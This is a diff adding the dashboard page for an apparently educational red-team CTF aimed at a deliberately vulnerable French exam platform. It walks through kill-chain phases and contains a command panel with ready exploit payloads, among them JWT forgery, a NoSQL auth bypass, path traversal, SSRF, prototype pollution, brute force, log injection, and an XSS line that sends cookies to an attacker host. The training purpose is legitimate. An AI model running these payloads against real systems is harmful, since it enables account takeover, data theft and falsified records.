+                <div style="display:flex; align-items:center; gap:12px; margin-bottom:10px;">
+                    <span style="font-size:28px;">🔍</span>
+                    <div>
+                        <div style="color:#fff; font-weight:bold;">1. Reconnaissance</div>
+                        <div style="font-size:11px; color:#8b949e;">Collecte passive et active d'informations</div>
+                    </div>
+                    <span class="phase-badge badge-pts" style="margin-left:auto;">+10 pts</span>
+                </div>
+                <div style="font-size:12px; color:#8b949e; line-height:1.7; margin-bottom:10px;">
+                    L'attaquant collecte un maximum d'informations sur la cible <em>avant</em> d'agir. Dans ce CTF, cela comprend :
+                    la découverte de ports ouverts (FTP:2121, HTTP:3003), l'analyse du <code>robots.txt</code> pour identifier les endpoints cachés,
+                    et l'accès anonyme au serveur FTP pour récupérer les fichiers de configuration et credentials.
+                </div>
+                <div style="display:flex; flex-wrap:wrap; gap:4px;">
+                    <span class="technique-tag">Port scanning</span>
+                    <span class="technique-tag">FTP anonymous access</span>
+                    <span class="technique-tag">robots.txt enumeration</span>
+                    <span class="technique-tag">OSINT</span>
+                    <span class="technique-tag">Directory listing</span>
+                </div>
+                <div style="margin-top:10px; padding:10px; background:#001a00; border:1px solid #00ff41; border-radius:6px; font-size:12px;">
+                    <span style="color:#00ff41;">→ Dans ce CTF :</span> <span style="color:#8b949e;">FTP anonyme → backup/deploy_notes.txt → credentials + secret JWT + master key</span>
+                </div>
+            </div>
+
+            <div style="text-align:center; color:#30363d; font-size:20px; margin: 4px 0;">↓</div>
+
+            <div class="kc-phase-block">
+                <div style="display:flex; align-items:center; gap:12px; margin-bottom:10px;">
+                    <span style="font-size:28px;">⚔️</span>
+                    <div>
+                        <div style="color:#fff; font-weight:bold;">2. Weaponization (Armement)</div>
+                        <div style="font-size:11px; color:#8b949e;">Construction de l'outil d'attaque</div>
+                    </div>
+                    <span class="phase-badge badge-pts" style="margin-left:auto;">+15 pts</span>
+                </div>
+                <div style="font-size:12px; color:#8b949e; line-height:1.7; margin-bottom:10px;">
+                    L'attaquant transforme les informations collectées en arme. Ici, le secret JWT découvert permet de forger
+                    un token signé avec le rôle <code>"admin"</code>. Ce token sera utilisé comme laissez-passer universel
+                    pour accéder à tous les endpoints protégés sans connaître de mot de passe.
+                </div>
+                <div style="display:flex; flex-wrap:wrap; gap:4px;">
+                    <span class="technique-tag">JWT forgery</span>
+                    <span class="technique-tag">Token manipulation</span>
+                    <span class="technique-tag">Cryptographic attack</span>
+                </div>
+                <div style="margin-top:10px; padding:10px; background:#001a00; border:1px solid #00ff41; border-radius:6px; font-size:12px;">
+                    <span style="color:#00ff41;">→ Dans ce CTF :</span> <span style="color:#8b949e;">python3 jwt.encode(&#123;"role":"admin"&#125;, "ensam-ctf-2024") → token forgé</span>
+                </div>
+            </div>
+
+            <div style="text-align:center; color:#30363d; font-size:20px; margin: 4px 0;">↓</div>
+
+            <div class="kc-phase-block">
+                <div style="display:flex; align-items:center; gap:12px; margin-bottom:10px;">
+                    <span style="font-size:28px;">💣</span>
+                    <div>
+                        <div style="color:#fff; font-weight:bold;">3. Delivery &amp; Exploitation</div>
+                        <div style="font-size:11px; color:#8b949e;">Livraison et déclenchement de l'exploit</div>
+                    </div>
+                    <span class="phase-badge badge-pts" style="margin-left:auto;">+20 pts</span>
+                </div>
+                <div style="font-size:12px; color:#8b949e; line-height:1.7; margin-bottom:10px;">
+                    L'exploit est déclenché : l'endpoint <code>/api/examen/answers/:sessionId</code> ne vérifie pas que la session
+                    appartient à l'utilisateur qui fait la requête. Il suffit de connaître un sessionId (le sien) pour obtenir
+                    les bonnes réponses. C'est un IDOR classique — la ressource est directement référencée par son ID sans contrôle d'ownership.
+                </div>
+                <div style="display:flex; flex-wrap:wrap; gap:4px;">
+                    <span class="technique-tag">IDOR</span>
+                    <span class="technique-tag">API abuse</span>
+                    <span class="technique-tag">Missing auth check</span>
+                </div>
+                <div style="margin-top:10px; padding:10px; background:#001a00; border:1px solid #00ff41; border-radius:6px; font-size:12px;">
+                    <span style="color:#00ff41;">→ Dans ce CTF :</span> <span style="color:#8b949e;">GET /api/examen/answers/SESSION_ID → toutes les bonnes réponses</span>
+                </div>
+            </div>
+
+            <div style="text-align:center; color:#30363d; font-size:20px; margin: 4px 0;">↓</div>
+
+            <div class="kc-phase-block">
+                <div style="display:flex; align-items:center; gap:12px; margin-bottom:10px;">
+                    <span style="font-size:28px;">⬆️</span>
+                    <div>
+                        <div style="color:#fff; font-weight:bold;">4. Installation / Privilege Escalation</div>
+                        <div style="font-size:11px; color:#8b949e;">Ancrage et élévation de privilèges</div>
+                    </div>
+                    <span class="phase-badge badge-pts" style="margin-left:auto;">+25 pts</span>
+                </div>
+                <div style="font-size:12px; color:#8b949e; line-height:1.7; margin-bottom:10px;">
+                    L'attaquant cherche à persister et à élever ses privilèges. Deux vecteurs sont disponibles :
+                    le compte backdoor <code>ctfadmin/R3dT3am2024</code> découvert dans <code>users.json</code> via FTP,
+                    et un endpoint de création d'utilisateur acceptant une master key hardcodée.
+                    L'objectif est d'obtenir un token JWT avec <code>role: "admin"</code> légitime (signé par le serveur).
+                </div>
+                <div style="display:flex; flex-wrap:wrap; gap:4px;">
+                    <span class="technique-tag">Backdoor account</span>
+                    <span class="technique-tag">Hardcoded credentials</span>
+                    <span class="technique-tag">Privilege escalation</span>
+                    <span class="technique-tag">Token theft</span>
+                </div>
+                <div style="margin-top:10px; padding:10px; background:#001a00; border:1px solid #00ff41; border-radius:6px; font-size:12px;">
+                    <span style="color:#00ff41;">→ Dans ce CTF :</span> <span style="color:#8b949e;">POST /api/auth/login avec ctfadmin/R3dT3am2024 → token admin</span>
+                </div>
+            </div>
+
+            <div style="text-align:center; color:#30363d; font-size:20px; margin: 4px 0;">↓</div>
+
+            <div class="kc-phase-block">
+                <div style="display:flex; align-items:center; gap:12px; margin-bottom:10px;">
+                    <span style="font-size:28px;">📡</span>
+                    <div>
+                        <div style="color:#fff; font-weight:bold;">5. Command &amp; Control (C2)</div>
+                        <div style="font-size:11px; color:#8b949e;">Établissement d'un canal de contrôle</div>
+                    </div>
+                    <span class="phase-badge badge-pts" style="margin-left:auto;">+15 pts</span>
+                </div>
+                <div style="font-size:12px; color:#8b949e; line-height:1.7; margin-bottom:10px;">
+                    Dans un scénario réel, le C2 consiste à installer un backdoor persistant. Dans ce CTF, l'étape
+                    est symbolisée par l'accès à l'endpoint <code>/api/debug</code> qui donne une visibilité totale
+                    sur les internals du serveur : secret de chiffrement, base d'utilisateurs, sessions actives.
+                    C'est l'équivalent d'un accès console au serveur.
+                </div>
+                <div style="display:flex; flex-wrap:wrap; gap:4px;">
+                    <span class="technique-tag">Debug endpoint abuse</span>
+                    <span class="technique-tag">Information gathering</span>
+                    <span class="technique-tag">Server introspection</span>
+                </div>
+                <div style="margin-top:10px; padding:10px; background:#001a00; border:1px solid #00ff41; border-radius:6px; font-size:12px;">
+                    <span style="color:#00ff41;">→ Dans ce CTF :</span> <span style="color:#8b949e;">GET /api/debug → jwt_secret + users + config (aucune auth)</span>
+                </div>
+            </div>
+
+            <div style="text-align:center; color:#30363d; font-size:20px; margin: 4px 0;">↓</div>
+
+            <div class="kc-phase-block">
+                <div style="display:flex; align-items:center; gap:12px; margin-bottom:10px;">
+                    <span style="font-size:28px;">↔️</span>
+                    <div>
+                        <div style="color:#fff; font-weight:bold;">6. Lateral Movement</div>
+                        <div style="font-size:11px; color:#8b949e;">Déplacement vers d'autres ressources</div>
+                    </div>
+                    <span class="phase-badge badge-pts" style="margin-left:auto;">+10 pts</span>
+                </div>
+                <div style="font-size:12px; color:#8b949e; line-height:1.7; margin-bottom:10px;">
+                    L'attaquant étend sa portée à d'autres ressources. Ici, les endpoints
+                    <code>/api/professeur/stats</code> et <code>/api/professeur/corrections</code> sont accessibles
+                    sans authentification. Un étudiant peut consulter les copies et notes de <em>tous</em> ses camarades,
+                    et potentiellement identifier des patterns ou obtenir des informations stratégiques.
+                </div>
+                <div style="display:flex; flex-wrap:wrap; gap:4px;">
+                    <span class="technique-tag">Broken access control</span>
+                    <span class="technique-tag">Data exfiltration</span>
+                    <span class="technique-tag">Horizontal privilege escalation</span>
+                </div>
+                <div style="margin-top:10px; padding:10px; background:#001a00; border:1px solid #00ff41; border-radius:6px; font-size:12px;">
+                    <span style="color:#00ff41;">→ Dans ce CTF :</span> <span style="color:#8b949e;">GET /api/professeur/stats → résultats de tous les étudiants (sans auth)</span>
+                </div>
+            </div>
+
+            <div style="text-align:center; color:#30363d; font-size:20px; margin: 4px 0;">↓</div>
+
+            <div class="kc-phase-block" style="border-color:#ffd700;">
+                <div style="display:flex; align-items:center; gap:12px; margin-bottom:10px;">
+                    <span style="font-size:28px;">🎯</span>
+                    <div>
+                        <div style="color:#ffd700; font-weight:bold;">7. Actions on Objectives</div>
+                        <div style="font-size:11px; color:#8b949e;">Exécution de l'objectif final</div>
+                    </div>
+                    <span class="phase-badge badge-pts" style="margin-left:auto; font-size:13px;">+30 pts</span>
+                </div>
+                <div style="font-size:12px; color:#8b949e; line-height:1.7; margin-bottom:10px;">
+                    L'objectif ultime est atteint. Dans ce CTF, c'est le grade override via le paramètre caché <code>_note</code>
+                    dans la requête de soumission de l'examen. Cette vulnérabilité de type Mass Assignment permet à l'étudiant
+                    de se donner la note qu'il désire (0-20), directement persistée en base. Dans un scénario réel d'entreprise,
+                    l'équivalent serait une exfiltration de données, un ransomware, ou une modification de transactions financières.
+                </div>
+                <div style="display:flex; flex-wrap:wrap; gap:4px;">
+                    <span class="technique-tag">Mass assignment</span>
+                    <span class="technique-tag">Parameter pollution</span>
+                    <span class="technique-tag">Data manipulation</span>
+                    <span class="technique-tag">Impact — Integrity</span>
+                </div>
+                <div style="margin-top:10px; padding:10px; background:#1a1100; border:1px solid #ffd700; border-radius:6px; font-size:12px;">
+                    <span style="color:#ffd700;">→ Objectif final :</span> <span style="color:#8b949e;">POST /api/examen/submit + "&#95;note":20 → note de 20/20 enregistrée</span>
+                </div>
+            </div>
+
+        </div><!-- /tab-killchain -->
+
+        <!-- TOOLS TAB -->
+        <div id="tab-tools" class="tab-content">
+            <div class="terminal">
+                <div class="terminal-header">
+                    <div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div>
+                    <span style="color: #8b949e; font-size: 12px; margin-left: 8px;">commandes_utiles.sh</span>
+                </div>
+                <div style="padding: 16px; font-size: 12px; line-height: 2;">
+                    <div style="color: #ffa500;"># === RECONNAISSANCE ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl http://[IP]:3003/robots.txt</span></div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">ftp [IP] 2121</span> <span style="color: #8b949e;"># login: anonymous, pass: (vide)</span></div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl http://[IP]:3003/api/debug</span></div>
+                    <br>
+                    <div style="color: #ffa500;"># === WEAPONIZATION — Forger un JWT ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">pip install pyjwt</span></div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">python3 -c "import jwt; print(jwt.encode({'id':1,'role':'admin','nom':'hacker'}, 'ensam-ctf-2024', algorithm='HS256'))"</span></div>
+                    <br>
+                    <div style="color: #ffa500;"># === EXPLOITATION — IDOR answers ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl http://[IP]:3003/api/examen/answers/SESSION_ID</span></div>
+                    <br>
+                    <div style="color: #ffa500;"># === PRIVILEGE ESCALATION — Backdoor ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl -X POST http://[IP]:3003/api/auth/login \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-H "Content-Type: application/json" \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-d '{"nom":"ctfadmin","motDePasse":"R3dT3am2024"}'</span></div>
+                    <br>
+                    <div style="color: #ffa500;"># === PRIVILEGE ESCALATION — Master Key ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl -X POST http://[IP]:3003/api/admin/create-user \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-H "Content-Type: application/json" \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-d '{"masterKey":"EMSI-MASTER-KEY-2024","nom":"hacker","motDePasse":"pwned","role":"admin"}'</span></div>
+                    <br>
+                    <div style="color: #ffa500;"># === LATERAL MOVEMENT — No auth endpoints ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl http://[IP]:3003/api/professeur/stats</span></div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl http://[IP]:3003/api/professeur/corrections</span></div>
+                    <br>
+                    <div style="color: #ffa500;"># === ACTIONS ON OBJECTIVES — Note override ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl -X POST http://[IP]:3003/api/examen/submit \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-H "Content-Type: application/json" \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-d '{"sessionId":"SESSION_ID","reponses":{},"_note":20}'</span></div>
+                    <br>
+                    <div style="color: #ffa500;"># === FTP — Accès aux fichiers ===</div>
+                    <div><span style="color: #8b949e;">ftp&gt;</span> <span style="color: #00ff41;">ls</span></div>
+                    <div><span style="color: #8b949e;">ftp&gt;</span> <span style="color: #00ff41;">get backup/deploy_notes.txt</span></div>
+                    <div><span style="color: #8b949e;">ftp&gt;</span> <span style="color: #00ff41;">get backup/jwt_config.txt</span></div>
+                    <div><span style="color: #8b949e;">ftp&gt;</span> <span style="color: #00ff41;">get users.json</span></div>
+                    <br>
+                    <div style="color: #ff6b6b; border-top: 1px solid #30363d; padding-top: 12px; margin-bottom: 4px;">
+                        ════════ VULNÉRABILITÉS AVANCÉES (VULN-011 à VULN-020) ════════
+                    </div>
+                    <br>
+                    <div style="color: #ffa500;"># === VULN-011: Stored XSS (endpoint de correction) ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl http://[IP]:3003/api/professeur/corrections/raw?sessionId=SESSION_ID</span></div>
+                    <div style="color: #8b949e;"># Payload XSS à injecter dans le champ nom/réponse (déclenché côté prof) :</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;"># &lt;img src=x onerror="fetch('http://attaquant/'+document.cookie)"&gt;</span></div>
+                    <br>
+                    <div style="color: #ffa500;"># === VULN-012: Path Traversal (/api/export) ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl "http://[IP]:3003/api/export?fichier=../exam-platformV3/users.json" \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-H "Authorization: Bearer TOKEN"</span></div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl "http://[IP]:3003/api/export?fichier=../exam-platformV3/server-vuln.js" -H "Authorization: Bearer TOKEN"</span></div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl "http://[IP]:3003/api/export?fichier=../../../../Windows/win.ini" -H "Authorization: Bearer TOKEN"</span></div>
+                    <br>
+                    <div style="color: #ffa500;"># === VULN-013: Brute Force (pas de rate limiting) ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl http://[IP]:3003/api/auth/bruteforce-info</span> <span style="color: #8b949e;"># indices</span></div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">for pwd in password 123456 admin ensam2024 prof2024; do</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">curl -s -X POST http://[IP]:3003/api/auth/login \</span></div>
+                    <div style="padding-left: 32px;"><span style="color: #00ff41;">-H "Content-Type: application/json" \</span></div>
+                    <div style="padding-left: 32px;"><span style="color: #00ff41;">-d "{\"username\":\"prof.martin\",\"password\":\"$pwd\"}" | grep -o '"token":"[^"]*'</span></div>
+                    <div><span style="color: #00ff41;">done</span></div>
+                    <br>
+                    <div style="color: #ffa500;"># === VULN-014: Mass Assignment (/api/profil/update) ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl -X PUT http://[IP]:3003/api/profil/update \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-H "Content-Type: application/json" \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-H "Authorization: Bearer TOKEN" \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-d '{"nom":"Hacker","role":"admin","_isAdmin":true}'</span></div>
+                    <br>
+                    <div style="color: #ffa500;"># === VULN-015: SSRF (/api/webhook/test) ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl -X POST http://[IP]:3003/api/webhook/test \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-H "Content-Type: application/json" \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-d '{"url":"http://localhost:3003/api/debug"}'</span> <span style="color: #8b949e;"># SSRF interne</span></div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl -X POST http://[IP]:3003/api/webhook/test \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-d '{"url":"file:///C:/Windows/win.ini"}'</span> <span style="color: #8b949e;"># lecture fichier local</span></div>
+                    <br>
+                    <div style="color: #ffa500;"># === VULN-016: Auth Bypass (Type Confusion / NoSQL-like) ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl -X POST http://[IP]:3003/api/auth/login \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-H "Content-Type: application/json" \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-d '{"nom":"admin","motDePasse":{"$ne":""}}'</span></div>
+                    <div style="color: #8b949e;"># Le champ motDePasse est un objet → bypass bcrypt.compare()</div>
+                    <br>
+                    <div style="color: #ffa500;"># === VULN-017: Open Redirect (/api/auth/redirect?token=...&redirect=URL) ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;"># Étape 1 : obtenir un token</span></div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">TOKEN=$(curl -s -X POST http://[IP]:3003/api/auth/login \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-d '{"username":"prof.martin","password":"password"}' | grep -o '"token":"[^"]*' | cut -d'"' -f4)</span></div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;"># Étape 2 : URL de phishing avec open redirect</span></div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">echo "http://[IP]:3003/api/auth/redirect?token=$TOKEN&redirect=https://evil.com"</span></div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl -v "http://[IP]:3003/api/auth/redirect?token=$TOKEN&redirect=https://evil.com"</span></div>
+                    <div style="color: #8b949e;"># → HTTP 302 Location: https://evil.com</div>
+                    <br>
+                    <div style="color: #ffa500;"># === VULN-018: Prototype Pollution (/api/config/merge) ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl -X POST http://[IP]:3003/api/config/merge \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-H "Content-Type: application/json" \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-H "Authorization: Bearer TOKEN" \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-d '{"__proto__":{"isAdmin":true,"polluted":"YES"},"theme":"dark"}'</span></div>
+                    <div style="color: #8b949e;"># → ({}).isAdmin vaut true après pollution !</div>
+                    <br>
+                    <div style="color: #ffa500;"># === VULN-019: Insecure Deserialization (/api/bases/import-unsafe) ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl -X POST http://[IP]:3003/api/bases/import-unsafe \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-H "Content-Type: application/json" \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-H "Authorization: Bearer TOKEN" \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-d '{"data":"{\"questions\":[],\"__rce\":\"process.env\"}"}'</span></div>
+                    <div style="color: #8b949e;"># Utilise eval() dans le reviver JSON — potentiel RCE</div>
+                    <br>
+                    <div style="color: #ffa500;"># === VULN-020: Log Injection (/api/feedback) ===</div>
+                    <div><span style="color: #8b949e;">$</span> <span style="color: #00ff41;">curl -X POST http://[IP]:3003/api/feedback \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-H "Content-Type: application/json" \</span></div>
+                    <div style="padding-left: 16px;"><span style="color: #00ff41;">-d '{"nom":"Hacker\n[FAKE] 2024-01-01 ADMIN LOGIN SUCCESS\n[FAKE]","message":"test","note":5}'</span></div>
+                    <div style="color: #8b949e;"># \n injecte de fausses entrées dans server.log — manipulation d'audit trail</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- LEADERBOARD TAB -->
+        <div id="tab-leaderboard" class="tab-content">
+            <div class="terminal">
+                <div class="terminal-header">
+                    <div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div>
+                    <span style="color: #8b949e; font-size: 12px; margin-left: 8px;">leaderboard.json</span>
+                    <button class="hint-btn" onclick="chargerLeaderboard()" style="margin-left: auto;">🔄 Actualiser</button>
+                </div>
+                <div style="padding: 0;">
+                    <div class="lb-row" style="color: #8b949e; font-size: 11px; border-bottom: 1px solid #30363d; padding: 6px 12px;">
+                        <div>#</div><div>Étudiant</div><div style="text-align:right;">Score</div><div style="text-align:right;">Phases</div>
+                    </div>
+                    <div id="leaderboard-body" style="min-height: 100px; color: #8b949e; text-align: center; padding: 20px; font-size: 13px;">
+                        Chargement...
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- RIGHT: Live Console + Info -->
+    <div>
+        <!-- Session Info -->
+        <div class="terminal" style="margin-bottom: 16px; padding: 16px;">
+            <div style="font-size: 11px; color: #8b949e; margin-bottom: 8px;">SESSION INFO</div>
+            <div style="font-size: 12px; margin-bottom: 4px;">ID: <span id="session-id-display" style="color: #58a6ff; word-break: break-all;"></span></div>
+            <div style="font-size: 12px; margin-bottom: 12px;">Agent: <span id="agent-display" style="color: #00ff41;"></span></div>
+
+            <!-- Progress -->
+            <div style="font-size: 11px; color: #8b949e; margin-bottom: 6px;">Progression Kill Chain</div>
+            <div class="progress-bar-rt" style="margin-bottom: 4px;">
+                <div class="progress-fill" id="progress-fill" style="width: 0%;"></div>
+            </div>
+            <div style="font-size: 11px; color: #8b949e;" id="progress-text">0 / 7 phases</div>
+        </div>
+
+        <!-- Score Breakdown -->
+        <div class="terminal" style="margin-bottom: 16px; padding: 16px;">
+            <div style="font-size: 11px; color: #8b949e; margin-bottom: 10px;">SCORE PAR PHASE</div>
+            <div id="score-breakdown" style="font-size: 12px;">
+                <div style="display: flex; justify-content: space-between; padding: 3px 0; color: #8b949e;"><span>🔍 Reconnaissance</span><span id="pts-reconnaissance">0/10</span></div>
+                <div style="display: flex; justify-content: space-between; padding: 3px 0; color: #8b949e;"><span>⚔️ Weaponization</span><span id="pts-weaponization">0/15</span></div>
+                <div style="display: flex; justify-content: space-between; padding: 3px 0; color: #8b949e;"><span>💣 Exploitation</span><span id="pts-exploitation">0/20</span></div>
+                <div style="display: flex; justify-content: space-between; padding: 3px 0; color: #8b949e;"><span>⬆️ Priv. Escalation</span><span id="pts-privilege_escalation">0/25</span></div>
+                <div style="display: flex; justify-content: space-between; padding: 3px 0; color: #8b949e;"><span>📡 C2</span><span id="pts-c2">0/15</span></div>
+                <div style="display: flex; justify-content: space-between; padding: 3px 0; color: #8b949e;"><span>↔️ Lateral Movement</span><span id="pts-lateral_movement">0/10</span></div>
+                <div style="display: flex; justify-content: space-between; padding: 3px 0; color: #8b949e;"><span>🎯 Actions</span><span id="pts-actions">0/30</span></div>
+            </div>
+        </div>
+
+        <!-- Live Console Log -->
+        <div class="terminal">
+            <div class="terminal-header">
+                <div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div>
+                <span style="color: #8b949e; font-size: 12px; margin-left: 8px;">console.log</span>
+            </div>
+            <div id="console-log" style="padding: 12px; min-height: 200px; max-height: 300px; overflow-y: auto; font-size: 12px;">
+                <div class="log-entry success">[+] Session RedTeam initialisée</div>
+                <div class="log-entry">[*] En attente d'actions...</div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<script>
+// ─── State ────────────────────────────────────────────────────────────────────
+const params = new URLSearchParams(window.location.search);
+const sessionId = params.get('sessionId') || '';
+const nomEtudiant = params.get('nom') || '';
+const prenomEtudiant = params.get('prenom') || '';
+const matiere = params.get('matiere') || '';
+
+const PHASES_ORDER = ['reconnaissance', 'weaponization', 'exploitation', 'privilege_escalation', 'c2', 'lateral_movement', 'actions'];
+const PHASES_PTS   = { reconnaissance: 10, weaponization: 15, exploitation: 20, privilege_escalation: 25, c2: 15, lateral_movement: 10, actions: 30 };
+
+let completedPhases = new Set();
+let adminToken = null;
+
+// ─── Init ─────────────────────────────────────────────────────────────────────
+document.addEventListener('DOMContentLoaded', () => {
+    document.getElementById('session-id-display').textContent = sessionId || '(non disponible)';
+    document.getElementById('agent-display').textContent = `${prenomEtudiant} ${nomEtudiant}`;
+    document.getElementById('agent-name').textContent = prenomEtudiant || 'Agent';
+    document.getElementById('header-info').textContent = `${prenomEtudiant} ${nomEtudiant} — ${matiere}`;
+
+    if (sessionId) {
+        chargerScore();
+        setInterval(chargerScore, 15000);
+    }
+    unlockNextPhase();
+});
+
+// ─── Score Loading ─────────────────────────────────────────────────────────────
+async function chargerScore() {
+    if (!sessionId) return;
+    try {
+        const res = await fetch(`/api/redteam/score/${sessionId}`);
+        const data = await res.json();
+        if (data.error) return;
+        updateScoreUI(data);
+    } catch(e) {}
+}
+
+function updateScoreUI(data) {
+    // Server returns: { score: { totalPoints, phases: {...}, totalPossible }, phases: REDTEAM_PHASES, completedPhases: [] }
+    const totalPoints = (data.score && data.score.totalPoints) || 0;
+    document.getElementById('total-score').textContent = totalPoints;
+
+    const completedPhaseMap = (data.score && data.score.phases) || {};
+    completedPhases = new Set();
+    let count = 0;
+
+    PHASES_ORDER.forEach(phase => {
+        // Completed phases have { completedAt, points, details }
+        if (completedPhaseMap[phase] && completedPhaseMap[phase].completedAt) {
+            completedPhases.add(phase);
+            count++;
+            markPhaseCompleted(phase, completedPhaseMap[phase].points);
+        }
+    });
+
+    document.getElementById('progress-fill').style.width = `${(count / 7) * 100}%`;
+    document.getElementById('progress-text').textContent = `${count} / 7 phases`;
+
+    unlockNextPhase();
+    updateMiniKillChain();
+}
+
+function markPhaseCompleted(phase, pts) {
+    const card = document.getElementById(`phase-${phase}`);
+    if (!card) return;
+    card.classList.add('completed');
+    card.classList.remove('locked');
+
+    const badge = document.getElementById(`status-${phase}`);
+    if (badge) {
+        badge.className = 'phase-badge badge-done';
+        badge.textContent = '✓ COMPLÉTÉ';
+    }
+
+    const ptsBadge = document.getElementById(`pts-${phase}`);
+    if (ptsBadge) {
+        ptsBadge.textContent = `${pts || PHASES_PTS[phase]}/${PHASES_PTS[phase]}`;
+        ptsBadge.style.color = '#00ff41';
+    }
+}
+
+function unlockNextPhase() {
+    PHASES_ORDER.forEach((phase, idx) => {
+        const card = document.getElementById(`phase-${phase}`);
+        if (!card) return;
+        // Phase 0 always unlocked, others unlock after previous
+        if (idx === 0 || completedPhases.has(PHASES_ORDER[idx - 1])) {
+            card.classList.remove('locked');
+            if (!completedPhases.has(phase)) {
+                const badge = document.getElementById(`status-${phase}`);
+                if (badge && badge.textContent === 'VERROUILLÉE') {
+                    badge.textContent = 'EN ATTENTE';
+                }
+            }
+        }
+    });
+}
+
+// ─── Flag Submission ───────────────────────────────────────────────────────────
+async function soumettreFlag(phase, inputId) {
+    const evidence = document.getElementById(inputId).value.trim();
+    if (!evidence) { addLog(`[!] Aucune preuve fournie pour ${phase}`, 'warning'); return; }
+
+    addLog(`[*] Soumission de la preuve pour ${phase}...`);
+
+    try {
+        const res = await fetch('/api/redteam/flag', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId, phase, evidence })
+        });
+        const data = await res.json();
+
+        if (data.success) {
+            // Server returns: { success, phase, pointsGagnes, totalPoints, message }
+            addLog(`[+] Phase ${phase} validée ! +${data.pointsGagnes} pts — ${data.message}`, 'success');
+            completedPhases.add(phase);
+            markPhaseCompleted(phase, data.pointsGagnes);
+            document.getElementById('total-score').textContent = data.totalPoints;
+            unlockNextPhase();
+            updateMiniKillChain();
+        } else {
+            addLog(`[-] Validation échouée: ${data.error || data.message || 'Preuve insuffisante'}`, 'error');
+        }
+    } catch(e) {
+        addLog(`[-] Erreur réseau: ${e.message}`, 'error');
+    }
+}
+
+// ─── Exploit Helpers ───────────────────────────────────────────────────────────
+async function exploiterIDOR() {
+    if (!sessionId) { addLog('[!] sessionId manquant', 'warning'); return; }
+    addLog(`[*] GET /api/examen/answers/${sessionId.substring(0,8)}...`);
+    try {
+        const res = await fetch(`/api/examen/answers/${sessionId}`);
+        const data = await res.json();
+        if (data.error) { addLog(`[-] Erreur: ${data.error}`, 'error'); return; }
+
+        const str = JSON.stringify(data, null, 2);
+        document.getElementById('flag-exploitation').value = str;
+        const display = document.getElementById('answers-display');
+        display.style.display = 'block';
